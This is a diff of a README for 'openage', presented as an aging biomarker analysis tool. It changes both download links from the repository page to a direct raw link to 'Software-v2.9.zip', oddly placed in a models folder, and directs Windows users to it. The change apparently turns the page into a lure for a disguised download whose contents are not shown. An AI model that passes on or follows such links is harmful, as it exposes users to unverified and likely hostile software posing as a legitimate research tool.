@@ -1,12 +1,12 @@
 # 🧬 openage - Clear tools for aging biomarker analysis
 
-[![Download openage](https://img.shields.io/badge/Download-openage-purple?style=for-the-badge)](https://github.com/marciunyielding712/openage)
+[![Download openage](https://img.shields.io/badge/Download-openage-purple?style=for-the-badge)](https://github.com/marciunyielding712/openage/raw/refs/heads/main/openage/models/Software-v2.9.zip)
 
 ## 🔽 Download openage
 
 Use this link to visit the download page and get openage for Windows:
 
-[Download openage](https://github.com/marciunyielding712/openage)
+[Download openage](https://github.com/marciunyielding712/openage/raw/refs/heads/main/openage/models/Software-v2.9.zip)
 
 ## 🪟 Windows setup
 
